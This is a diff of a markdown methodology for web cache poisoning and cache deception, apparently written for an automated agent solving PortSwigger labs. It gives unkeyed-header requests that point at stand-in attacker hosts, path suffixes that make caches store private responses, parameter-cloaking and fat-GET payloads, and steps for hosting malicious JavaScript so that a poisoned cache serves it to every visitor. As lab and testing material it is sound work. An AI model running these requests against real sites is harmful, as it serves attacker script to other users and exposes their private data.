@@ -1,114 +1,142 @@
-# Web Cache Poisoning
+# Web Cache Poisoning Methodology
+## Expert-Level Playbook (unkeyed inputs, cache-key manipulation, chaining)
 
-> Sister bug to request smuggling. Cheaper to detect, often easier to
-> exploit. The diff tool is your primary lens.
-
----
-
-## Phase 1: Identify the Cache Layer
-
-### Headers that betray a cache
-- `X-Cache: HIT|MISS` (CloudFront, Varnish, Fastly)
-- `Cache-Control`, `CDN-Cache-Control`
-- `Age:` (always present on cached responses)
-- `X-Served-By`, `X-Varnish`, `X-Cache-Hits`, `X-Pass`
-- `Via:` `1.1 cloudfront`, `1.1 varnish`, `1.1 google`
-
-Capture a baseline, then resend — second response arrives faster and gets
-`Age` header populated → cached. That's the surface.
+> 13 PortSwigger labs. Goal: get a harmful response stored in a shared cache so
+> it is served to other users. Distinct from web cache *deception* (which
+> tricks the cache into storing a victim's private response). Always test with a
+> unique cache buster, then remove it for the final persistent poison.
 
 ---
 
-## Phase 2: The Cache Key
+## Phase 1: Recon — Is it cacheable, and what is the cache key?
 
-The cache decides "is this request the same as a previous one?" by hashing
-a subset of the request: usually URL + Host. Anything OUTSIDE the cache
-key is unkeyed — and unkeyed input that influences the response = poison.
-
-### Detection: unkeyed input via diff
-1. `capture_baseline(name="clean", url="/")`
-2. Send the same URL but with an extra header you suspect is unkeyed:
-   `X-Forwarded-Host: <oob>.attacker.com`
-3. `diff_against_baseline(baseline_name="clean", url="/", headers={...})`
-4. If response now reflects `<oob>` somewhere AND the cache returns this
-   poisoned version on a CLEAN request, you've poisoned the cache.
-
-### Common unkeyed inputs to fuzz
+### 1.1 Identify caching
 ```
-X-Forwarded-Host: <oob>
-X-Host: <oob>
-X-Forwarded-Server: <oob>
-X-HTTP-Host-Override: <oob>
-Forwarded: for=...;host=<oob>
-X-Original-URL: /admin
-X-Rewrite-URL: /admin
-X-Forwarded-Scheme: nothttps
-X-Forwarded-Proto: ftp
-X-Forwarded-Port: 81
-X-Forwarded-For: <oob>
+http_request url=https://TARGET/  # inspect response headers
 ```
+Look for: `X-Cache: hit|miss`, `Cache-Control`, `Age`, `X-Cache-Hits`,
+`CF-Cache-Status`, `Vary`, `Cache-Status`. Repeat the request: a second `hit`
+with an increasing `Age` confirms caching.
 
-For each: send the request, then send a CLEAN request with NO custom
-headers from a different origin/IP — does it now return the poisoned
-response? Use `diff_against_baseline` to see precisely.
+### 1.2 Cache-buster discipline
+Add a unique unkeyed param each attempt so you never poison the real key while
+probing: `?cb=reynard123`. Confirm your buster is *unkeyed* (not part of the
+key) by verifying two different values still share a cached response.
+
+### 1.3 Find unkeyed inputs (the whole game)
+Inputs the cache ignores in its key but the origin reflects/acts on:
+- `Host`, `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`
+- `X-Forwarded-For`, `X-Host`, `X-Original-URL`, `X-Rewrite-URL`
+- Query params excluded from the key, cookies, `Accept-Encoding`, `Origin`
+Use Param Miner-style header brute force:
+```
+ffuf_fuzz  # or burp_send_to_intruder with a header wordlist
+burp_get_proxy_history_regex  # confirm what the origin reflects
+```
 
 ---
 
-## Phase 3: Cache Deception (Sister Technique)
+## Phase 2: Detection Primitives
 
-A different bug class but adjacent: trick the cache into storing
-sensitive content under a public-looking URL.
+### 2.1 Unkeyed header reflection
+```
+GET /?cb=1 HTTP/1.1
+Host: TARGET
+X-Forwarded-Host: canary.evil-cache.test
+```
+If `canary.evil-cache.test` appears in the response body (e.g. in an absolute
+resource URL, `<link>`, canonical, or JS import), it's a poisoning primitive.
 
-```
-GET /api/me HTTP/1.1                      <- normal (private, no cache)
-GET /api/me/nonexistent.css HTTP/1.1      <- cache thinks it's a CSS,
-                                              caches private content
-                                              under that URL
-```
+### 2.2 Confirm it caches
+Send the malicious request WITH a cache buster, then request the same
+buster WITHOUT the header — if the canary persists, the poison is cached under
+that key.
 
-Try every public-looking suffix the cache might honour:
-```
-.css .js .jpg .png .ico .svg .woff .woff2 .gif .map .json
-```
-Mid-path:
-```
-/api/me/.css
-/api/me;.css
-/api/me%00.css
-/api/me%23.css
-/api/me%3F.css
-/api/me/x.css
-```
-
-Test as user1, then fetch the same path as `unauth` (use `swap_session`)
-— if you get user1's data, that's the bug.
+### 2.3 Common reflected sinks → impact
+| Unkeyed input reflected into | Impact |
+|------------------------------|--------|
+| `<script src>` / import URL   | load attacker JS → stored XSS for all users |
+| `<link rel=stylesheet>`       | CSS injection / exfil |
+| Open redirect `Location`      | mass redirect |
+| Absolute URLs from Host       | resource hijack |
+| `Vary`-excluded content-type  | serve wrong content |
 
 ---
 
-## Phase 4: Cache Key Normalization Bugs
+## Phase 3: Exploitation (per sub-variant)
 
-The cache and the origin disagree on how to normalize URLs. Common splits:
-- `/path` vs. `/path/`
-- `/PATH` vs. `/path`
-- `/path?` vs. `/path`
-- `/path#x` vs. `/path` (fragment stripped at one layer not the other)
-- `;jsessionid=...` parameter stripping
-- `..` and `.` segment normalization
+| Sub-variant | Technique |
+|-------------|-----------|
+| Unkeyed header → XSS | reflect `X-Forwarded-Host` into a script/resource URL, host malicious JS |
+| Unkeyed cookie | cookie reflected + cached (rare; needs cookie in reflected content) |
+| Multiple headers | chain e.g. `X-Forwarded-Host` + `X-Forwarded-Scheme` to force absolute attacker URL |
+| Cache key injection | inject via a keyed header that is parsed loosely (e.g. `:` in Host) |
+| Parameter cloaking | exclude a param from the key using `;`/duplicate params so origin sees it but cache doesn't |
+| Fat GET | body params on a GET that the origin honors but the cache ignores |
+| Normalization discrepancy | cache vs origin differ on path/param normalization |
+| Internal cache poisoning | chain with request smuggling to poison the response queue |
 
-Send variations. If different layers see different paths, you can
-poison "X" but the cache stores under "Y", which is fetched by victims.
+### 3.1 Unkeyed header → stored XSS (canonical lab)
+```
+GET /?cb=poison HTTP/1.1
+Host: TARGET
+X-Forwarded-Host: exploit-XXXX.exploit-server.net
+```
+If the origin builds `<script src="//X-Forwarded-Host/resources/js/tracking.js">`,
+host a malicious `/resources/js/tracking.js` on the exploit server, poison the
+key, then remove the buster so victims hit the poisoned `/`.
+
+### 3.2 Parameter cloaking / exclusion
+```
+GET /?utm_content=x&callback=setResult;cb=1 HTTP/1.1   # ';' splits differently
+GET /?param=value1&param=value2 HTTP/1.1               # duplicate-key handling
+```
+Force the cache to key on a benign value while the origin acts on the malicious
+duplicate.
+
+### 3.3 Fat GET
+```
+GET /?param=benign HTTP/1.1
+Host: TARGET
+Content-Length: 19
+
+param=<script>...</script>
+```
+Origin honors the body param, cache keys only the URL.
+
+### 3.4 Chained with request smuggling
+Use `request_smuggling_probe` / raw send to smuggle a request whose response is
+cached against a victim key (see request_smuggling.md §3.4).
 
 ---
 
-## Phase 5: Verification
+## Phase 4: Tooling
 
-A reportable cache poisoning PoC:
-1. Send the poisoning request
-2. From a fresh client (no cookies, different session): fetch the
-   target URL and capture the poisoned response
-3. Show the `X-Cache: HIT` / `Age` proving it came from the cache
-4. Note the TTL — how long does the poison survive?
+```
+http_request              # header/param probing + reflection checks
+capture_baseline / diff_against_baseline   # confirm cached vs fresh delta
+ffuf_fuzz / burp_send_to_intruder          # header + param name brute force
+burp_get_proxy_history_regex               # find where inputs reflect
+# Host malicious resource for header→XSS chains:
+# exploit_server.store(head, body, path="/resources/js/tracking.js")
+```
 
-The validator's counter-probe: send the SAME headers but to a unique
-URL the cache hasn't seen — confirms the headers are the cause, not
-some other condition.
+---
+
+## Common Failure Modes & Solutions
+
+| Problem | Solution |
+|---------|----------|
+| Poison won't stick | You cached under a buster key; remove buster for final poison |
+| Header not reflected | Brute-force more header names (Param Miner wordlist) |
+| Response not cached | Find a cacheable path (static ext, GET, `Cache-Control: public`) |
+| `Vary` splits cache | Match the `Vary` header values (e.g. `User-Agent`, `Accept-Encoding`) |
+| Reflection HTML-encoded | Look for URL/attribute/script-src contexts that don't encode |
+| TTL too short to observe | Re-poison immediately before the victim request |
+
+## Validation / Success Criteria
+- [ ] Malicious value appears in a *cached* response (second request, no header).
+- [ ] A different cache key (control) stays clean.
+- [ ] The poison produces real impact (XSS executes, redirect fires) for a
+      victim-equivalent request.
+- [ ] Lab solved banner observed.
